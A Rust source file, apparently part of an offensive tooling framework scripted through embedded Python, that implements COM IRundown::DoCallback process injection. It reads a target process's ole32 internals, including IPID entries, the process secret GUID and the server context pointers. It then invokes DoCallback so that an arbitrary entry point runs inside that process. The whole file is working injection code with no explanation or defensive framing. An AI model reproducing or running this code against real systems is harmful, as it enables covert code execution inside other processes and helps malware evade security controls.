use crate::prelude::*;
use crate::sysapi;
use crate::python;

use std::ops::Add;
use base64::prelude::*;

use windef::{winbase, rpcwin, ntpebteb};
use windef::rpc_rundown::*;
use windef::rpc_lclor::*;

use windows_sys::Win32::System::Threading::THREAD_QUERY_INFORMATION;
use windows_sys::Win32::System::Com::{CoGetObject, CoInitialize};
use windows::core::{GUID, HRESULT};
use winbase::ULONG_PTR;

use rustpython_vm::{
    VirtualMachine,
    pyclass,
    FromArgs,
    PyPayload, PyRef, PyObjectRef, PyResult,
    types::Constructor,
    builtins::{PyTypeRef},
};

use python::py_proc::Process;

#[allow(non_upper_case_globals)]
static IID_IRundown: GUID = GUID {
    data1: 0x00000134,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[pyclass(module = false, name = "ComIRundown")]
#[derive(Debug, PyPayload)]
pub struct ComIRundown {
    process: PyRef<Process>,
    ole32_address: usize,
    ole32_secret_rva: usize,
    ole32_palloc_rva: usize,
    ole32_emptyctx_rva: usize,
    moxid_offset: usize,

    ipid_entries: RefCell<Vec<IpidEntry>>,
    ole32_secret: GUID,
    global_ctx_addr: PVOID,
}

#[derive(FromArgs)]
pub struct ComIRundownNewArgs {
    #[pyarg(any)]
    process: PyRef<Process>,
    #[pyarg(any)]
    ole32_address: usize,
    #[pyarg(any)]
    ole32_secret_rva: usize,
    #[pyarg(any)]
    ole32_palloc_rva: usize,
    #[pyarg(any)]
    ole32_emptyctx_rva: usize,
    #[pyarg(any)]
    moxid_offset: usize,
}

impl Constructor for ComIRundown {
    type Args = ComIRundownNewArgs;

    fn py_new(cls: PyTypeRef, args: Self::Args, vm: &VirtualMachine) -> PyResult<PyObjectRef> {

        Self {
            process: args.process,
            ole32_address: args.ole32_address,
            ole32_secret_rva: args.ole32_secret_rva,
            ole32_palloc_rva: args.ole32_palloc_rva,
            ole32_emptyctx_rva: args.ole32_emptyctx_rva,
            moxid_offset: args.moxid_offset,
            ipid_entries: RefCell::new(Vec::new()),
            ole32_secret: Default::default(),
            global_ctx_addr: ptr::null_mut(),
        }
        .into_ref_with_type(vm, cls)
        .map(Into::into)
    }
}

#[derive(FromArgs)]
pub struct ExecuteArgs {
    #[pyarg(any)]
    ep: usize,
    #[pyarg(any, optional)]
    arg1: usize,
}

#[repr(C)]
#[derive(Debug)]
pub struct IpidEntry {
    iid: GUID,
    ipid: GUID,
    oxid: OXID,
    oid: OID,
}

fn connect_to_irundown(oid: OID, oxid: OXID, ipid: IPID) -> result::Result<*mut IRundown, HRESULT> {
    unsafe {
        let hr = HRESULT(CoInitialize(ptr::null_mut()));
        if hr.is_err() {
            return Err(hr);
        }

        let mut obj_ref: OBJREF = Default::default();
        obj_ref.signature = OBJREF_SIGNATURE;
        obj_ref.flags = OBJREF_STANDARD;
        obj_ref.iid = mem::transmute::<GUID, windows_sys::core::GUID>(IID_IRundown);

        let u_standard = obj_ref.u_objref.u_standard.as_mut();
        u_standard.std.flags = 0;
        u_standard.std.cPublicRefs = 1;
        u_standard.std.oid = oid;
        u_standard.std.oxid = oxid;
        u_standard.std.ipid = ipid;
        u_standard.saResAddr.wNumEntries = 0;
        u_standard.saResAddr.wSecurityOffset = 0;

        let objref_bytes = slice::from_raw_parts(
            addr_of!(obj_ref) as *const u8,
            size_of::<OBJREF>()
        );

        let name = U16CString::from_str(format!("OBJREF:{}:", BASE64_STANDARD.encode(objref_bytes))).unwrap();

        // TODO: RAII release
        let obj: *mut IRundown = ptr::null_mut();

        let hr = HRESULT(CoGetObject(
            name.into_raw(),
            ptr::null_mut(),
            &obj_ref.iid,
            addr_of!(obj) as _
        ));

        if hr.is_err() {
            return Err(hr);
        }

        Ok(obj)
    }
}

#[pyclass(with(Constructor))]
impl ComIRundown {

    #[pymethod]
    fn read_ipid_entries(&self, vm: &VirtualMachine) -> PyResult<()> {
        unsafe {
            let mut memory = self.process.memory.borrow_mut();
            let memory = memory
                .as_mut()
                .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;

            let palloc = rpcwin::CPageAllocator::default();

            memory.set_remote_base_addr(ptr::null_mut());
            memory.read_memory(
                self.ole32_address.add(self.ole32_palloc_rva),
                addr_of!(palloc) as _,
                size_of::<rpcwin::CPageAllocator>()
            ).map_err(|e| {
                vm.new_system_error(format!(
                    "Failed to read ole32!palloc: {}",
                    sysapi::ntstatus_decode(e)
                ))
            })?;

            let pages_cnt = palloc._pgalloc._cPages as usize;
            let pages_size = pages_cnt * size_of::<ULONG_PTR>();

            let pages: Vec<ULONG_PTR> = vec![0; pages_cnt];
            memory.read_memory(
                palloc._pgalloc._pPageListStart as _,
                pages.as_ptr() as _,
                pages_size
            ).map_err(|e| {
                vm.new_system_error(format!(
                    "Failed to read ole32!palloc pages: {}",
                    sysapi::ntstatus_decode(e)
                ))
            })?;

            let ipid_cnt = palloc._pgalloc._cEntriesPerPage as usize;
            let ipid_size = ipid_cnt * size_of::<rpcwin::IPIDEntry>();

            let mut ipid_entries_raw: Vec<rpcwin::IPIDEntry> = Vec::with_capacity(ipid_cnt);
            ipid_entries_raw.resize_with(ipid_cnt, || mem::zeroed());

            let mut ipid_entries = Vec::<IpidEntry>::default();

            for i in 0..pages_cnt {
                memory.read_memory(
                    pages[i] as _,
                    ipid_entries_raw.as_ptr() as _,
                    ipid_size
                ).map_err(|e| {
                    vm.new_system_error(format!(
                        "Failed to read ole32!palloc IPID entries: {}",
                        sysapi::ntstatus_decode(e)
                    ))
                })?;

                for j in 0..ipid_cnt {
                    let entry = &ipid_entries_raw[j];

                    if entry.pOXIDEntry == ptr::null_mut() || entry.dwFlags == 0 {
                        continue;
                    }

                    if entry.dwFlags & (rpcwin::IPIDFlags::IPIDF_DISCONNECTED as u32 | rpcwin::IPIDFlags::IPIDF_DEACTIVATED as u32) != 0 {
                        continue;
                    }

                    let iid = GUID::from(mem::transmute::<windows_sys::core::GUID, GUID>(entry.iid));
                    if iid != IID_IRundown {
                        continue;
                    }

                    #[repr(C)]
                    struct OxidOid {
                        oxid: OXID,
                        oid: OID,
                    }

                    let oxid_oid: OxidOid = mem::zeroed();
                    memory.read_memory(
                        entry.pOXIDEntry.add(self.moxid_offset) as _,
                        addr_of!(oxid_oid) as _,
                        size_of::<OxidOid>()
                    ).map_err(|e| {
                        vm.new_system_error(format!(
                            "Failed to read ole32!palloc IPID entries: {}",
                            sysapi::ntstatus_decode(e)
                        ))
                    })?;

                    if oxid_oid.oxid == 0 || oxid_oid.oid == 0 {
                        continue;
                    }

                    let ipid_entry = IpidEntry {
                        iid: GUID::from(mem::transmute::<windows_sys::core::GUID, GUID>(entry.iid)),
                        ipid: GUID::from(mem::transmute::<windows_sys::core::GUID, GUID>(entry.ipid)),
                        oxid: oxid_oid.oxid,
                        oid: oxid_oid.oid,
                    };

                    ipid_entries.push(ipid_entry);
                }
            }

            self.ipid_entries.replace(ipid_entries);
            Ok(())
        }
    }

    #[pymethod]
    fn execute(&self, args: ExecuteArgs, vm: &VirtualMachine) -> PyResult<()> {
        unsafe {
            let mut memory = self.process.memory.borrow_mut();
            let memory = memory
                .as_mut()
                .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;

            for ipid_entry in self.ipid_entries.borrow().iter() {
                let ipid_values: rpcwin::IPID_VALUES = mem::transmute(ipid_entry.ipid);
                let valid_tid = ipid_values.tid != 0 && ipid_values.tid != u16::MAX;

                let irundown = connect_to_irundown(
                    ipid_entry.oid,
                    ipid_entry.oxid,
                    mem::transmute::<GUID, windows_sys::core::GUID>(ipid_entry.ipid)
                ).unwrap();

                let mut server_ctx_addr: PVOID = ptr::null_mut();

                if valid_tid {
                    let thread = sysapi::open_thread(self.process.pid, ipid_values.tid as _, THREAD_QUERY_INFORMATION)
                        .map_err(|e| vm.new_system_error(format!(
                            "Failed to open thread {}: {}",
                            ipid_values.tid, sysapi::ntstatus_decode(e)
                        )))?;

                    let basic_info = sysapi::get_thread_basic_info(*thread)
                        .map_err(|e| vm.new_system_error(format!(
                            "Failed to get thread {} basic info: {}",
                            ipid_values.tid, sysapi::ntstatus_decode(e)
                        )))?;

                    let ole_addr: PVOID = Default::default();

                    memory.read_memory(
                        (basic_info.TebBaseAddress as PVOID).add(offset_of!(ntpebteb::TEB, ReservedForOle)) as _,
                        addr_of!(ole_addr) as _,
                        size_of::<PVOID>()
                    ).map_err(|e| {
                        vm.new_system_error(format!(
                            "Failed to read thread Teb::ReservedForOle: {}",
                            sysapi::ntstatus_decode(e)
                        ))
                    })?;

                    let ole_tls_data: rpcwin::SOleTlsData = Default::default();

                    memory.read_memory(
                        ole_addr as _,
                        addr_of!(ole_tls_data) as _,
                        size_of::<rpcwin::SOleTlsData>()
                    ).map_err(|e| {
                        vm.new_system_error(format!(
                            "Failed to read thread SOleTlsData: {}",
                            sysapi::ntstatus_decode(e)
                        ))
                    })?;

                    server_ctx_addr = ole_tls_data.pCurrentContext;
                }

                if server_ctx_addr == ptr::null_mut() {
                    if self.global_ctx_addr == ptr::null_mut() {
                        memory.read_memory(
                            self.ole32_address.add(self.ole32_emptyctx_rva) as _,
                            addr_of!(self.global_ctx_addr) as _,
                            size_of::<PVOID>()
                        ).map_err(|e| {
                            vm.new_system_error(format!(
                                "Failed to read process g_pMTAEmptyCtx: {}",
                                sysapi::ntstatus_decode(e)
                            ))
                        })?;
                    }

                    server_ctx_addr = self.global_ctx_addr;
                }

                let mut params: XAptCallback = Default::default();
                params.pServerCtx = server_ctx_addr as _;
                params.pfnCallback = args.ep as _;
                params.pParam = args.arg1 as _;

                if self.ole32_secret == GUID::default() {
                    memory.read_memory(
                        self.ole32_address.add(self.ole32_secret_rva) as _,
                        addr_of!(self.ole32_secret) as _,
                        size_of::<GUID>()
                    ).map_err(|e| {
                        vm.new_system_error(format!(
                            "Failed to read process CProcessSecret::s_guidOle32Secret: {}",
                            sysapi::ntstatus_decode(e)
                        ))
                    })?;

                    // invoking IRundown::DoCallback() with invalid secret to init...
                    if self.ole32_secret == GUID::default() {
                        (*(*irundown).lpVtbl).DoCallback.unwrap()(irundown, &mut params);

                        memory.read_memory(
                            self.ole32_address.add(self.ole32_secret_rva) as _,
                            addr_of!(self.ole32_secret) as _,
                            size_of::<GUID>()
                        ).map_err(|e| {
                            vm.new_system_error(format!(
                                "Failed to read process CProcessSecret::s_guidOle32Secret: {}",
                                sysapi::ntstatus_decode(e)
                            ))
                        })?;
                    }
                }

                params.guidProcessSecret = mem::transmute::<GUID, windows_sys::core::GUID>(self.ole32_secret);

                let hr = HRESULT((*(*irundown).lpVtbl).DoCallback.unwrap()(irundown, &mut params));
                if hr.is_err() {
                    continue;
                }

                return Ok(())
            }

            Err(vm.new_system_error(format!(
                "No valid IPID entry found for IRundown in the process {}",
                self.process.pid
            )))
        }
    }
}
